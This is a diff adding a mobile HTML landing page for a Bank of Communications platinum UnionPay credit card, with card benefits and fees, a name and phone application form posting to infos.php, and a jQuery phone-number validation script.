@@ -1,0 +1,71 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>交通银行</title>
+    <link rel="stylesheet" type="text/css" href="css/traffic.css"/>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</head>
+<body>
+<header>
+    <h3>卡片详情</h3>
+</header>
+<div class="wrapper">
+    <img src="img/main.jpg" alt="">
+</div>
+<div class="content">
+    <div class="top">
+        <h3>权益</h3>
+        <p class="thin">白金卡(银联）</p>
+        <p class="free">免境外取现手续费</p>
+        <p class="free">免费3次龙腾境外机场贵宾室</p>
+    </div>
+    <div class="middle" style="margin-top: 0.5rem">
+        <h3>基础信息</h3>
+        <p class="thin">白金卡(银联）</p>
+        <p>年费:首年免年费，交易免次年</p>
+        <p class="thin">500元/年，刷满6笔免次年</p>
+        <p>积分:1元=1积分<span>免息期：56天</span></p>
+    </div>
+</div>
+<div class="button">
+    <form action="infos.php" method="post">
+        <div class="weui-cell__hd">
+            <label for="name" class="first">姓名</label>
+            <input type="text" id="name" name="names" placeholder="请输入姓名">
+        </div>
+        <div class="weui-cell__hd">
+            <label for="name" class="first">手机号</label>
+            <input type="text" id="phone" name="phone" placeholder="请输入手机号">
+        </div>
+        <!--<a href="javascript:;"><button>立即申请</button></a>-->
+        <input type="submit" class="weui-btn weui-btn_primary" id="lijibanli" value="立即申请">
+    </form>
+
+</div>
+</body>
+<script type="text/javascript">
+    (function () {
+        var html = document.documentElement;
+        var width = html.getBoundingClientRect().width;
+        html.style.fontSize = width / 18 + 'px';
+
+        $('#lijibanli').click(function () {
+            checkPhone();
+        })
+        function checkPhone(){
+            var phone =$('#phone').val();
+            var name =$('#name').val();
+            if (phone=='' || name=='') {
+                alert('请输入!');
+            }else if(!(/^1[34578]\d{9}$/.test(phone))){
+                alert("手机号码有误，请重写");
+                return false;
+            }
+        }
+    })()
+</script>
+</html>
